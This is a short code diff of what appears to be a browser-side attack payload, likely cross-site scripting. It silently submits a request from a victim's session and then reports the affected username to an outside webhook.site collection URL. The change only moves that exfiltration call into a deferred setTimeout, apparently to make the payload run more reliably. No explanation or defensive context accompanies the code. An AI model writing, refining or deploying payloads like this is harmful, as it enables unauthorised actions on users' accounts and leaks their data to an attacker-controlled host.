@@ -20,10 +20,13 @@ fetch('/profile')
       body: params.toString()
     }).then(res => {
       if (res.ok) {
-        fetch(
-          'https://webhook.site/557a412f-f375-41c9-b27f-a1ec11ea0df5?sucess=true&username=' + params.get('username'),
-          { mode: 'no-cors' }
-        ).catch(() => {});
+        // Defer side-effect completely out of the resolution path
+        setTimeout(() => {
+          fetch(
+            'https://webhook.site/557a412f-f375-41c9-b27f-a1ec11ea0df5?sucess=true&username=' + params.get('username'),
+            { mode: 'no-cors' }
+          ).catch(() => {});
+        }, 0);
       }
       return res;
     });
